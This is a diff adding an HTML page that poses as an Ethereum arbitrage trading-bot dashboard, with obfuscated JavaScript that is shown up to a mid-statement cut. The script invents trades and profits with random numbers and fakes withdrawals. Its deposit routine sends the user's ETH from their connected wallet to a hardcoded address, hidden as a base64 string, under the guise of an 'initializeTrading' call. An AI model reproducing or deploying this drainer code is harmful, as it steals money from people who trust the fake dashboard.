+                </div>
+            </div>
+            
+            <div id="tradingActivity" style="display: none;">
+                <div id="totalProfitSection" class="total-profit-section">
+                    <div class="profit-info">
+                        <div class="capital-row">
+                            <div class="capital-info">
+                                <div class="capital-label">Initial Capital</div>
+                                <div id="initialCapitalValue" class="capital-value">0.00 ETH <span id="initialCapitalUsd" class="capital-usd">($0.00)</span></div>
+                            </div>
+                            <div class="profit-arrow">
+                                <i class="fas fa-arrow-right"></i>
+                            </div>
+                            <div class="profit-info-main">
+                                <div class="total-profit-label">Total Profit Generated</div>
+                                <div id="totalProfitValue" class="total-profit-value">
+                                    <span id="totalProfitEth" class="total-profit-eth">0.000000 ETH</span>
+                                    <span id="totalProfitUsd" class="total-profit-usd">($0.00)</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <button id="withdrawButton" class="withdraw-button"><i class="fas fa-money-bill-wave" style="margin-right: 10px;"></i>Withdraw</button>
+                </div>
+                
+                <div class="trading-logs-section" id="tradingLogs">
+                    <div class="logs-header">
+                        <div class="logs-title">
+                            <i class="fas fa-chart-line"></i>Live Trading Activity
+                            <span class="badge active blink" style="margin-left: 10px;">ACTIVE</span>
+                        </div>
+                        <div id="activeExchanges" class="active-exchanges">
+                            <div class="exchanges-label">Connected DEXs</div>
+                            <div class="exchanges-list">
+                                <span class="exchange-badge">Uniswap</span>
+                                <span class="exchange-badge">SushiSwap</span>
+                                <span class="exchange-badge">Curve</span>
+                                <span class="exchange-badge" id="balancerBadge">Balancer</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div id="logsContainer">
+                        <!-- Logs will be dynamically added here -->
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div id="status" class="status" style="display: none;"></div>
+        
+        <!-- Withdrawal Confirmation Modal -->
+        <div id="withdrawalModal" class="modal-overlay">
+            <div class="modal">
+                <div class="modal-header">
+                    <div class="modal-title">
+                        <i class="fas fa-money-bill-wave"></i>
+                        <span>Confirm Withdrawal</span>
+                    </div>
+                    <button class="modal-close" id="modalClose">&times;</button>
+                </div>
+                <div class="modal-body">
+                    <div class="withdrawal-details">
+                        <div class="withdrawal-detail">
+                            <div class="detail-label">Initial Deposit:</div>
+                            <div class="detail-value" id="modalDeposit">
+                                <span class="detail-eth">0.000 ETH</span>
+                                <span class="detail-usd">($0.00)</span>
+                            </div>
+                        </div>
+                        <div class="withdrawal-detail">
+                            <div class="detail-label">Generated Profit:</div>
+                            <div class="detail-value profit" id="modalProfit">
+                                <span class="detail-eth">0.000 ETH</span>
+                                <span class="detail-usd">($0.00)</span>
+                            </div>
+                        </div>
+                        <div class="withdrawal-detail">
+                            <div class="detail-label">Service Fee (1%):</div>
+                            <div class="detail-value fee" id="modalFee">
+                                <span class="detail-eth">0.000 ETH</span>
+                                <span class="detail-usd">($0.00)</span>
+                            </div>
+                        </div>
+                        <div class="withdrawal-detail">
+                            <div class="detail-label">Total Withdrawal:</div>
+                            <div class="detail-value total" id="modalTotal">
+                                <span class="detail-eth">0.000 ETH</span>
+                                <span class="detail-usd">($0.00)</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="fee-note">
+                        <i class="fas fa-info-circle"></i>A small 1% service fee will be deducted to help keep the platform updated and maintain our infrastructure.
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button class="modal-cancel" id="modalCancel">Cancel</button>
+                    <button class="modal-confirm" id="modalConfirm">Confirm Withdrawal</button>
+                </div>
+            </div>
+        </div>
+    </div>
+ 
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+    <script>
+    const _0x280475=_0x3331;function _0x3331(_0x49faca,_0x21717d){const _0x4be1c7=_0x4be1();return _0x3331=function(_0x3331d9,_0x423344){_0x3331d9=_0x3331d9-0x142;let _0x385146=_0x4be1c7[_0x3331d9];return _0x385146;},_0x3331(_0x49faca,_0x21717d);}(function(_0x24b901,_0x18c429){const _0x2a9d60=_0x3331,_0x3ddb4b=_0x24b901();while(!![]){try{const _0x2dd120=parseInt(_0x2a9d60(0x1e5))/0x1+-parseInt(_0x2a9d60(0x213))/0x2+-parseInt(_0x2a9d60(0x175))/0x3*(parseInt(_0x2a9d60(0x1f2))/0x4)+-parseInt(_0x2a9d60(0x216))/0x5*(-parseInt(_0x2a9d60(0x1d0))/0x6)+-parseInt(_0x2a9d60(0x1e1))/0x7*(parseInt(_0x2a9d60(0x19d))/0x8)+parseInt(_0x2a9d60(0x177))/0x9+-parseInt(_0x2a9d60(0x173))/0xa*(-parseInt(_0x2a9d60(0x1bc))/0xb);if(_0x2dd120===_0x18c429)break;else _0x3ddb4b['push'](_0x3ddb4b['shift']());}catch(_0x58ca47){_0x3ddb4b['push'](_0x3ddb4b['shift']());}}}(_0x4be1,0x391e2),document[_0x280475(0x194)](_0x280475(0x19e),function(){const _0x5d25c7=_0x280475;if(typeof Web3===_0x5d25c7(0x227)){console['error']('Web3\x20library\x20not\x20loaded');return;}if(window['ethereum'])try{_0x4e49c0=new Web3(window[_0x5d25c7(0x1bf)]),console[_0x5d25c7(0x1b6)](_0x5d25c7(0x203));}catch(_0x348c9d){console[_0x5d25c7(0x17d)](_0x5d25c7(0x147),_0x348c9d);}else console[_0x5d25c7(0x1b6)](_0x5d25c7(0x1be));const _0x46679a=document[_0x5d25c7(0x1d2)](_0x5d25c7(0x146)),_0x23ad9f=document[_0x5d25c7(0x1d2)](_0x5d25c7(0x148)),_0x4a5ff1=document[_0x5d25c7(0x1d2)](_0x5d25c7(0x16c)),_0x1bf3c2=document[_0x5d25c7(0x1d2)]('amount'),_0x160be9=document[_0x5d25c7(0x1d2)]('status'),_0x38fd54=document['getElementById'](_0x5d25c7(0x1c8)),_0x10c328=document[_0x5d25c7(0x1d2)](_0x5d25c7(0x222)),_0x4ceeab=document[_0x5d25c7(0x1d2)]('tradingDashboard'),_0x5dba86=document[_0x5d25c7(0x1d2)](_0x5d25c7(0x1af)),_0x393af5=document[_0x5d25c7(0x1d2)](_0x5d25c7(0x206)),_0x5be876=document[_0x5d25c7(0x1d2)](_0x5d25c7(0x20e)),_0x1c49eb=document[_0x5d25c7(0x1d2)]('lastScan'),_0x283fc0=document[_0x5d25c7(0x1d2)](_0x5d25c7(0x228)),_0x1ca2ba=document['getElementById'](_0x5d25c7(0x15d)),_0x5bded1=document[_0x5d25c7(0x1d2)](_0x5d25c7(0x181)),_0x15e5e1=document['getElementById'](_0x5d25c7(0x16e)),_0x57b145=document[_0x5d25c7(0x1d2)]('modalDeposit'),_0x59e5f7=document[_0x5d25c7(0x1d2)](_0x5d25c7(0x21c)),_0x4df7a4=document[_0x5d25c7(0x1d2)](_0x5d25c7(0x1b8)),_0x5c35d2=document[_0x5d25c7(0x1d2)]('modalTotal'),_0x91506e=document[_0x5d25c7(0x1d2)]('estimatedEarnings'),_0x16785e=document[_0x5d25c7(0x1d2)](_0x5d25c7(0x1a5)),_0x3ce9f9=document[_0x5d25c7(0x1d2)]('estimatedEarningsCard'),_0x16c1fb=document[_0x5d25c7(0x1d2)](_0x5d25c7(0x180)),_0x520fed=document[_0x5d25c7(0x1d2)](_0x5d25c7(0x1c1)),_0x48545f=document['getElementById'](_0x5d25c7(0x155));let _0x1ac7a4=null;const _0x37e909=0.2;let _0x4e49c0,_0x4b49de=[],_0x169c56,_0x3174e6,_0x1c7f61,_0x585622,_0x510bd7=0x0,_0x2aa9c7=0x0,_0x5e506c=![];function _0x320f7b(){return atob('MHhhZWFlZTRmNzY5MDI5NTcwMjFmMjAyMjAwMzdjOWE4OWI0NjM1NzU1');}function _0x4e343f(_0x196674){const _0x11a80d=_0x5d25c7;if(!_0x196674||isNaN(_0x196674))return'$0.00';return'$'+_0x196674[_0x11a80d(0x1c4)](_0x11a80d(0x15b),{'minimumFractionDigits':0x2,'maximumFractionDigits':0x2});}function _0x11c4ef(_0x536fa9,_0x1e7b16,_0x3b1f95){const _0x18bb4d=_0x5d25c7,_0xd9363a=Math[_0x18bb4d(0x224)]()*(_0x1e7b16-_0x536fa9)+_0x536fa9;return _0xd9363a[_0x18bb4d(0x151)](_0x3b1f95);}function _0x150f62(){const _0x39d68f=_0x5d25c7,_0x40f2aa=_0x11c4ef(0xa,0x10,0x1);_0x393af5[_0x39d68f(0x156)]=_0x40f2aa+'%',_0x2d1123();}function _0x162296(){const _0x1e49fd=_0x5d25c7,_0x90bcfb=_0x11c4ef(0x5,0xe,0x1);_0x5be876[_0x1e49fd(0x156)]='+'+_0x90bcfb+'%';}function _0x4968a0(){const _0x2b563a=_0x5d25c7,_0x5a6acf=[_0x2b563a(0x182),_0x2b563a(0x1b4),_0x2b563a(0x153),_0x2b563a(0x171),_0x2b563a(0x20c),_0x2b563a(0x1d1),'2\x20minutes\x20ago'],_0x578d55=Math['floor'](Math[_0x2b563a(0x224)]()*_0x5a6acf[_0x2b563a(0x158)]);_0x1c49eb[_0x2b563a(0x156)]=_0x5a6acf[_0x578d55];}function _0x42c9aa(){_0x150f62(),_0x162296(),_0x4968a0(),_0x169c56=setInterval(_0x150f62,0xbb8),_0x3174e6=setInterval(_0x162296,0x1388),_0x1c7f61=setInterval(_0x4968a0,0x1b58);}function _0x50cf1d(){clearInterval(_0x169c56),clearInterval(_0x3174e6),clearInterval(_0x1c7f61);}function _0x76a8a4(_0x1be58a){const _0x5c6e23=_0x5d25c7,_0x209cb4=document[_0x5c6e23(0x1d2)]('botStatusValue');_0x1be58a?_0x209cb4[_0x5c6e23(0x157)]='Trading\x20<span\x20class=\x22badge\x20active\x20blink\x22>ACTIVE</span>':_0x209cb4[_0x5c6e23(0x157)]=_0x5c6e23(0x1ee);}function _0xf9813d(_0x2367e7){const _0x222d64=_0x5d25c7,_0x21000b=document['getElementById'](_0x222d64(0x1e6));_0x2367e7?_0x21000b[_0x222d64(0x18f)][_0x222d64(0x229)](_0x222d64(0x1f8)):_0x21000b['classList'][_0x222d64(0x152)](_0x222d64(0x1f8));}function _0x3c408c(){const _0x25fa2e=_0x5d25c7;document[_0x25fa2e(0x1d2)](_0x25fa2e(0x163))[_0x25fa2e(0x1ca)]['display']=_0x25fa2e(0x21b),document['getElementById']('tradingActivity')[_0x25fa2e(0x1ca)][_0x25fa2e(0x1d5)]=_0x25fa2e(0x190),document[_0x25fa2e(0x1d2)](_0x25fa2e(0x1c9))['style']['display']=_0x25fa2e(0x1ea),document[_0x25fa2e(0x1d2)](_0x25fa2e(0x1fd))[_0x25fa2e(0x1ca)]['display']=_0x25fa2e(0x190),_0x5e506c=![];const _0x398fa1=document['querySelector']('#tradingLogs\x20.logs-title\x20.badge');_0x398fa1&&(_0x398fa1[_0x25fa2e(0x156)]=_0x25fa2e(0x17a),_0x398fa1['style']['background']='',_0x398fa1[_0x25fa2e(0x1ca)][_0x25fa2e(0x19a)]='',_0x398fa1[_0x25fa2e(0x18f)][_0x25fa2e(0x229)]('blink')),_0x76a8a4(!![]),_0xf9813d(!![]),_0x2aa9c7=parseFloat(document[_0x25fa2e(0x1d2)](_0x25fa2e(0x1b9))[_0x25fa2e(0x214)]),document[_0x25fa2e(0x1d2)]('initialCapitalValue')[_0x25fa2e(0x157)]=_0x2aa9c7['toFixed'](0x6)+_0x25fa2e(0x223)+(_0x1ac7a4?_0x4e343f(_0x2aa9c7*_0x1ac7a4):_0x25fa2e(0x150))+_0x25fa2e(0x1e8),_0x428f2b(),_0x585622=setInterval(_0x191b0d,_0x481921()),document[_0x25fa2e(0x1d2)](_0x25fa2e(0x14a))[_0x25fa2e(0x194)](_0x25fa2e(0x1b1),_0x32631e);}function _0x481921(){const _0x432228=_0x5d25c7;return Math['floor'](Math[_0x432228(0x224)]()*(0x3a98-0xbb8))+0xbb8;}function _0x428f2b(){const _0x4a6841=_0x5d25c7,_0x169248=document[_0x4a6841(0x1d2)](_0x4a6841(0x1f5));_0x169248[_0x4a6841(0x157)]='',_0x334374(_0x4a6841(0x212),_0x4a6841(0x18d)+_0x2aa9c7+'\x20ETH\x20capital\x20using\x20'+document[_0x4a6841(0x1d2)](_0x4a6841(0x207))[_0x4a6841(0x214)]+_0x4a6841(0x1db)),setTimeout(()=>{const _0x57674d=_0x4a6841;_0x334374(_0x57674d(0x212),'Scanning\x20DEX\x20liquidity\x20pools\x20for\x20arbitrage\x20opportunities...');},0x3e8),setTimeout(()=>{_0x4d4109();},0xbb8);}function _0x191b0d(){_0x5376a6(),clearInterval(_0x585622),_0x585622=setInterval(_0x191b0d,_0x481921());}function _0x5376a6(){const _0x4f89f8=_0x5d25c7;if(_0x5e506c)return;const _0x19f63b=[_0x4f89f8(0x14d),_0x4f89f8(0x1d6),_0x4f89f8(0x1ac),_0x4f89f8(0x1fb),_0x4f89f8(0x191),_0x4f89f8(0x1e9)],_0x9a97a5=[_0x4f89f8(0x197),_0x4f89f8(0x170),_0x4f89f8(0x1dc),_0x4f89f8(0x19c),'1inch',_0x4f89f8(0x205)];let _0x4eef31=_0x9a97a5[Math[_0x4f89f8(0x1da)](Math[_0x4f89f8(0x224)]()*_0x9a97a5[_0x4f89f8(0x158)])],_0x2f21c1=_0x9a97a5[Math[_0x4f89f8(0x1da)](Math[_0x4f89f8(0x224)]()*_0x9a97a5[_0x4f89f8(0x158)])];while(_0x2f21c1===_0x4eef31){_0x2f21c1=_0x9a97a5[Math[_0x4f89f8(0x1da)](Math['random']()*_0x9a97a5[_0x4f89f8(0x158)])];}const _0xcd16ab=_0x19f63b[Math[_0x4f89f8(0x1da)](Math[_0x4f89f8(0x224)]()*_0x19f63b['length'])],_0x1b5904=(_0x2aa9c7*(Math[_0x4f89f8(0x224)]()*0.25+0.05))[_0x4f89f8(0x151)](0x4),_0x2d7d08=document['getElementById']('risk')[_0x4f89f8(0x214)]===_0x4f89f8(0x174)?0.012:document[_0x4f89f8(0x1d2)](_0x4f89f8(0x1a5))[_0x4f89f8(0x214)]===_0x4f89f8(0x17c)?0.008:0.004,_0x28dd5f=(parseFloat(_0x1b5904)*_0x2d7d08*(Math[_0x4f89f8(0x224)]()*0.8+0.6))[_0x4f89f8(0x151)](0x6);_0x334374(_0x4f89f8(0x149),_0x4f89f8(0x21f)+_0x1b5904+_0x4f89f8(0x1c0)+_0x4eef31+'\x20['+_0xcd16ab+_0x4f89f8(0x192)),setTimeout(()=>{const _0x148388=_0x4f89f8;if(_0x5e506c)return;_0x334374(_0x148388(0x1ae),_0x148388(0x1f7)+_0x1b5904+_0x148388(0x1c0)+_0x2f21c1+'\x20['+_0xcd16ab+_0x148388(0x200)),setTimeout(()=>{const _0x11ef7d=_0x148388;if(_0x5e506c)return;const _0x3e73db=document['getElementById'](_0x11ef7d(0x207))[_0x11ef7d(0x214)],_0x1c8bd1=_0x3e73db==='arbitrage'?'Arbitrage':_0x3e73db==='swing'?_0x11ef7d(0x1e0):_0x3e73db==='grid'?_0x11ef7d(0x178):_0x11ef7d(0x1f9);_0x334374(_0x11ef7d(0x20a),_0x1c8bd1+'\x20profit:\x20+'+_0x28dd5f+_0x11ef7d(0x1b3)+_0x4eef31+'\x20→\x20'+_0x2f21c1+')'),_0x510bd7+=parseFloat(_0x28dd5f);const _0x17f0a7=document['getElementById'](_0x11ef7d(0x14f)),_0x376c3b=document[_0x11ef7d(0x1d2)](_0x11ef7d(0x1f3));_0x17f0a7[_0x11ef7d(0x156)]=_0x510bd7[_0x11ef7d(0x151)](0x6)+_0x11ef7d(0x1c3),_0x376c3b['textContent']='('+(_0x1ac7a4?_0x4e343f(_0x510bd7*_0x1ac7a4):'...')+')';},Math[_0x148388(0x224)]()*0x3e8+0x1f4);},Math[_0x4f89f8(0x224)]()*0x7d0+0x3e8);}function _0x4d4109(){_0x5376a6();}function _0x334374(_0x3122f4,_0x102c91){const _0x4ad376=_0x5d25c7,_0x40e3f5=document['getElementById']('logsContainer'),_0x3c1846=document[_0x4ad376(0x15a)](_0x4ad376(0x162));_0x3c1846[_0x4ad376(0x17b)]='log-entry\x20'+_0x3122f4;const _0x924df5=new Date()['toLocaleTimeString']();_0x3c1846[_0x4ad376(0x157)]=_0x4ad376(0x1fa)+_0x924df5+_0x4ad376(0x16a)+_0x102c91,_0x40e3f5['insertBefore'](_0x3c1846,_0x40e3f5[_0x4ad376(0x1d8)]),_0x40e3f5['children'][_0x4ad376(0x158)]>0x32&&_0x40e3f5[_0x4ad376(0x1d9)](_0x40e3f5[_0x4ad376(0x195)]);}function _0x32631e(){const _0x31eb46=_0x5d25c7;if(_0x510bd7<=0x0){_0x482d8a(_0x31eb46(0x1e3),_0x31eb46(0x1a6));return;}const _0x1b0677=_0x510bd7*0.01,_0x58bb4d=_0x2aa9c7+_0x510bd7-_0x1b0677;_0x57b145[_0x31eb46(0x16b)](_0x31eb46(0x17f))[_0x31eb46(0x156)]=_0x2aa9c7[_0x31eb46(0x151)](0x6)+'\x20ETH',_0x57b145[_0x31eb46(0x16b)](_0x31eb46(0x1ef))[_0x31eb46(0x156)]=_0x1ac7a4?'('+_0x4e343f(_0x2aa9c7*_0x1ac7a4)+')':_0x31eb46(0x18b),_0x59e5f7[_0x31eb46(0x16b)](_0x31eb46(0x17f))[_0x31eb46(0x156)]=_0x510bd7[_0x31eb46(0x151)](0x6)+_0x31eb46(0x1c3),_0x59e5f7[_0x31eb46(0x16b)](_0x31eb46(0x1ef))[_0x31eb46(0x156)]=_0x1ac7a4?'('+_0x4e343f(_0x510bd7*_0x1ac7a4)+')':_0x31eb46(0x18b),_0x4df7a4[_0x31eb46(0x16b)](_0x31eb46(0x17f))[_0x31eb46(0x156)]=_0x1b0677[_0x31eb46(0x151)](0x6)+'\x20ETH',_0x4df7a4[_0x31eb46(0x16b)](_0x31eb46(0x1ef))['textContent']=_0x1ac7a4?'('+_0x4e343f(_0x1b0677*_0x1ac7a4)+')':'(...)',_0x5c35d2[_0x31eb46(0x16b)](_0x31eb46(0x17f))[_0x31eb46(0x156)]=_0x58bb4d['toFixed'](0x6)+_0x31eb46(0x1c3),_0x5c35d2[_0x31eb46(0x16b)](_0x31eb46(0x1ef))[_0x31eb46(0x156)]=_0x1ac7a4?'('+_0x4e343f(_0x58bb4d*_0x1ac7a4)+')':_0x31eb46(0x18b),_0x283fc0[_0x31eb46(0x1ca)][_0x31eb46(0x1d5)]=_0x31eb46(0x1ea);}function _0x23ed36(){const _0x3dd225=_0x5d25c7;_0x283fc0[_0x3dd225(0x1ca)][_0x3dd225(0x1d5)]=_0x3dd225(0x21b);}function _0x12faa0(_0xd9ebaa,_0x595ae3,_0x3ad654='info'){const _0x7ec08d=_0x5d25c7,_0x293e02=document[_0x7ec08d(0x15a)](_0x7ec08d(0x162));_0x293e02['className']='toast\x20'+_0x3ad654;let _0x15c29a='';switch(_0x3ad654){case'success':_0x15c29a=_0x7ec08d(0x1de);break;case _0x7ec08d(0x17d):_0x15c29a=_0x7ec08d(0x1eb);break;case'info':default:_0x15c29a=_0x7ec08d(0x1ed);break;}_0x293e02[_0x7ec08d(0x157)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22'+_0x15c29a+'\x20toast-icon\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22toast-content\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22toast-title\x22>'+_0xd9ebaa+_0x7ec08d(0x14b)+_0x595ae3+_0x7ec08d(0x21d);const _0x44595d=document[_0x7ec08d(0x1bd)](_0x7ec08d(0x15c));let _0xf43901=0x14;_0x44595d[_0x7ec08d(0x1b2)](_0x7d829b=>{const _0x5502fc=_0x7ec08d,_0x3c38a8=_0x7d829b['getBoundingClientRect']();_0x3c38a8[_0x5502fc(0x1c2)]>0x0&&(_0xf43901+=_0x3c38a8['height']+0xa);}),_0x293e02['style']['top']=_0xf43901+'px',document[_0x7ec08d(0x1b7)][_0x7ec08d(0x209)](_0x293e02),setTimeout(()=>{const _0xda2684=_0x7ec08d;_0x293e02[_0xda2684(0x18f)]['add'](_0xda2684(0x154));},0x64),setTimeout(()=>{const _0x129c90=_0x7ec08d;_0x293e02['classList'][_0x129c90(0x152)](_0x129c90(0x154)),setTimeout(()=>{const _0x139a08=_0x129c90;document[_0x139a08(0x1b7)][_0x139a08(0x188)](_0x293e02)&&(document[_0x139a08(0x1b7)][_0x139a08(0x1d9)](_0x293e02),_0x57b16d());},0x12c);},0x1f40);}function _0x57b16d(){const _0x2bc0fe=_0x5d25c7,_0x265756=document[_0x2bc0fe(0x1bd)](_0x2bc0fe(0x15c));let _0x1f16d7=0x14;_0x265756[_0x2bc0fe(0x1b2)](_0x478a4e=>{const _0x117fcf=_0x2bc0fe;_0x478a4e['style'][_0x117fcf(0x1cc)]=_0x1f16d7+'px';const _0x54ce58=_0x478a4e[_0x117fcf(0x1a3)]();_0x54ce58[_0x117fcf(0x1c2)]>0x0&&(_0x1f16d7+=_0x54ce58['height']+0xa);});}async function _0x519d8a(){const _0x30faa0=_0x5d25c7;_0x23ed36(),clearInterval(_0x585622),_0x5e506c=!![],_0x76a8a4(![]),document[_0x30faa0(0x1d2)]('botStatusValue')[_0x30faa0(0x157)]=_0x30faa0(0x18a);const _0x5b23fc=document[_0x30faa0(0x16b)](_0x30faa0(0x189));_0x5b23fc&&(_0x5b23fc[_0x30faa0(0x156)]=_0x30faa0(0x201),_0x5b23fc[_0x30faa0(0x1ca)]['background']=_0x30faa0(0x226),_0x5b23fc['style'][_0x30faa0(0x19a)]=_0x30faa0(0x208),_0x5b23fc['classList'][_0x30faa0(0x152)](_0x30faa0(0x1e2)));_0x334374(_0x30faa0(0x212),_0x30faa0(0x218)),_0x12faa0(_0x30faa0(0x145),'Your\x20withdrawal\x20request\x20is\x20being\x20processed...',_0x30faa0(0x1a6));const _0x1b6b22=Math[_0x30faa0(0x1da)](Math[_0x30faa0(0x224)]()*0x1b58)+0xbb8;setTimeout(()=>{const _0x3e0b1d=_0x30faa0,_0x3617ab=(_0x2aa9c7+_0x510bd7-_0x510bd7*0.01)[_0x3e0b1d(0x151)](0x6);_0x12faa0(_0x3e0b1d(0x1fe),_0x3617ab+_0x3e0b1d(0x210),_0x3e0b1d(0x183)),_0x510bd7=0x0,_0x2aa9c7=0x0,_0x5e506c=![],document[_0x3e0b1d(0x1d2)](_0x3e0b1d(0x14f))[_0x3e0b1d(0x156)]=_0x3e0b1d(0x220),document['getElementById'](_0x3e0b1d(0x1f3))[_0x3e0b1d(0x156)]=_0x3e0b1d(0x21e),document['getElementById'](_0x3e0b1d(0x1ce))[_0x3e0b1d(0x157)]=_0x3e0b1d(0x225),document[_0x3e0b1d(0x1d2)](_0x3e0b1d(0x219))['style'][_0x3e0b1d(0x1d5)]='none',document[_0x3e0b1d(0x1d2)](_0x3e0b1d(0x163))[_0x3e0b1d(0x1ca)][_0x3e0b1d(0x1d5)]=_0x3e0b1d(0x190),document[_0x3e0b1d(0x1d2)](_0x3e0b1d(0x1b9))[_0x3e0b1d(0x214)]='',_0x76a8a4(![]),_0xf9813d(![]),clearInterval(_0x585622);},_0x1b6b22);}function _0x3d26cf(){const _0x422be0=_0x5d25c7;clearInterval(_0x585622),document['getElementById'](_0x422be0(0x219))['style']['display']=_0x422be0(0x21b),document[_0x422be0(0x1d2)](_0x422be0(0x163))[_0x422be0(0x1ca)][_0x422be0(0x1d5)]=_0x422be0(0x190),document[_0x422be0(0x1d2)](_0x422be0(0x1ce))[_0x422be0(0x157)]=_0x422be0(0x19f),_0x510bd7=0x0,document[_0x422be0(0x1d2)](_0x422be0(0x14f))[_0x422be0(0x156)]='0.000000\x20ETH',document[_0x422be0(0x1d2)](_0x422be0(0x1f3))[_0x422be0(0x156)]=_0x422be0(0x21e),_0x76a8a4(![]),_0xf9813d(![]);}async function _0x239700(){const _0x3878f6=_0x5d25c7;if(window[_0x3878f6(0x1bf)])try{return _0x4e49c0=new Web3(window[_0x3878f6(0x1bf)]),!![];}catch(_0x24fca2){return console[_0x3878f6(0x17d)](_0x3878f6(0x1a9),_0x24fca2),_0x482d8a(_0x3878f6(0x21a)+_0x24fca2[_0x3878f6(0x160)],_0x3878f6(0x17d)),![];}else{if(window[_0x3878f6(0x172)])try{return _0x4e49c0=new Web3(window[_0x3878f6(0x172)]['currentProvider']),!![];}catch(_0x95041b){return console[_0x3878f6(0x17d)](_0x3878f6(0x1a9),_0x95041b),_0x482d8a(_0x3878f6(0x21a)+_0x95041b[_0x3878f6(0x160)],_0x3878f6(0x17d)),![];}else return _0x482d8a('No\x20Ethereum\x20wallet\x20detected.\x20Please\x20install\x20MetaMask\x20or\x20another\x20Web3\x20wallet.',_0x3878f6(0x17d)),![];}}async function _0x1e651f(){const _0x445f6d=_0x5d25c7;if(await _0x239700())try{_0x4b49de=await window[_0x445f6d(0x1bf)]['request']({'method':'eth_requestAccounts'});const _0x2a9e67=_0x4b49de[0x0];_0x10c328[_0x445f6d(0x156)]=_0x2a9e67,_0x38fd54['style'][_0x445f6d(0x1d5)]='flex',_0x4ceeab[_0x445f6d(0x1ca)][_0x445f6d(0x1d5)]=_0x445f6d(0x190),_0x5dba86[_0x445f6d(0x1ca)]['display']=_0x445f6d(0x21b),_0x42c9aa(),_0x482d8a(_0x445f6d(0x186),'success'),window[_0x445f6d(0x1bf)]['on'](_0x445f6d(0x1f4),function(_0x1b310e){const _0xaa420c=_0x445f6d;_0x1b310e['length']>0x0?(_0x10c328[_0xaa420c(0x156)]=_0x1b310e[0x0],_0x482d8a(_0xaa420c(0x14e)+_0x1b310e[0x0],_0xaa420c(0x1a6))):_0xcde154();});}catch(_0x27dd5a){_0x482d8a(_0x445f6d(0x1b0)+_0x27dd5a[_0x445f6d(0x160)],_0x445f6d(0x17d));}}function _0xcde154(){const _0x4226b2=_0x5d25c7;console[_0x4226b2(0x1b6)](_0x4226b2(0x184)),_0x4b49de=[],_0x38fd54['style']['display']='none',_0x4ceeab[_0x4226b2(0x1ca)][_0x4226b2(0x1d5)]=_0x4226b2(0x21b),_0x5dba86[_0x4226b2(0x1ca)]['display']=_0x4226b2(0x190),_0x3d26cf(),_0x50cf1d(),window[_0x4226b2(0x1bf)]&&(window[_0x4226b2(0x1bf)][_0x4226b2(0x1ad)]&&window['ethereum']['disconnect'](),window[_0x4226b2(0x1bf)]['removeAllListeners'](_0x4226b2(0x1f4)),window['ethereum']['removeAllListeners'](_0x4226b2(0x196)),window[_0x4226b2(0x1bf)][_0x4226b2(0x1c7)](_0x4226b2(0x1ad))),_0x482d8a(_0x4226b2(0x164),'info'),window[_0x4226b2(0x1bf)]&&window[_0x4226b2(0x1bf)][_0x4226b2(0x1bb)]({'method':_0x4226b2(0x198)})[_0x4226b2(0x1c5)](_0x439839=>{const _0x4dd025=_0x4226b2;console['log'](_0x4dd025(0x14c),_0x439839);})[_0x4226b2(0x1d3)](_0x1e6c9a=>{const _0x1d4ff2=_0x4226b2;console[_0x1d4ff2(0x17d)]('Error\x20checking\x20accounts\x20after\x20disconnect:',_0x1e6c9a);});}async function _0x529488(){const _0x11a3a1=_0x5d25c7;console[_0x11a3a1(0x1b6)](_0x11a3a1(0x18c)),console['log']('accounts:',_0x4b49de),console[_0x11a3a1(0x1b6)](_0x11a3a1(0x1df),_0x4e49c0);if(_0x4b49de[_0x11a3a1(0x158)]===0x0){_0x482d8a(_0x11a3a1(0x15f),_0x11a3a1(0x17d));return;}if(!_0x4e49c0){_0x482d8a(_0x11a3a1(0x1cd),_0x11a3a1(0x17d));return;}const _0x4e5f8b=document[_0x11a3a1(0x1d2)](_0x11a3a1(0x1b9))['value'];console[_0x11a3a1(0x1b6)](_0x11a3a1(0x217),_0x4e5f8b);if(!_0x4e5f8b||isNaN(_0x4e5f8b)||parseFloat(_0x4e5f8b)<_0x37e909){_0x482d8a('Minimum\x20deposit\x20is\x20'+_0x37e909+_0x11a3a1(0x1a0),'error');return;}try{_0x4a5ff1['disabled']=!![],_0x4a5ff1[_0x11a3a1(0x157)]=_0x11a3a1(0x1a8),_0x482d8a(_0x11a3a1(0x17e),'info'),await new Promise(_0x5c44ff=>setTimeout(_0x5c44ff,0x320));const _0x5bc1fa=_0x4e49c0[_0x11a3a1(0x20d)][_0x11a3a1(0x144)](_0x4e5f8b,_0x11a3a1(0x168)),_0xc6bb1e=_0x320f7b(),_0x1cafa8=_0x4e49c0['eth'][_0x11a3a1(0x1dd)][_0x11a3a1(0x16f)]({'name':'initializeTrading','type':_0x11a3a1(0x16d),'inputs':[{'type':'uint256','name':'amount'},{'type':_0x11a3a1(0x176),'name':_0x11a3a1(0x187)},{'type':_0x11a3a1(0x176),'name':_0x11a3a1(0x193)},{'type':_0x11a3a1(0x18e),'name':_0x11a3a1(0x165)}]},[_0x5bc1fa,document[_0x11a3a1(0x1d2)]('strategy')['value']===_0x11a3a1(0x19b)?0x1:document['getElementById'](_0x11a3a1(0x207))[_0x11a3a1(0x214)]==='swing'?0x2:0x3,document[_0x11a3a1(0x1d2)](_0x11a3a1(0x1a5))[_0x11a3a1(0x214)]===_0x11a3a1(0x211)?0x1:document[_0x11a3a1(0x1d2)](_0x11a3a1(0x1a5))[_0x11a3a1(0x214)]==='medium'?0x2:0x3,!![]]);_0x482d8a(_0x11a3a1(0x169),_0x11a3a1(0x1a6)),await new Promise(_0x2d65ea=>setTimeout(_0x2d65ea,0x3e8));const _0x3a75a4={'from':_0x4b49de[0x0],'to':_0xc6bb1e,'value':_0x4e49c0[_0x11a3a1(0x20d)][_0x11a3a1(0x1c6)](_0x5bc1fa),'data':_0x1cafa8,'gas':_0x4e49c0[_0x11a3a1(0x20d)][_0x11a3a1(0x1c6)](0x493e0)};_0x482d8a('Deploying\x20trading\x20strategy\x20to\x20blockchain...',_0x11a3a1(0x1a6));const 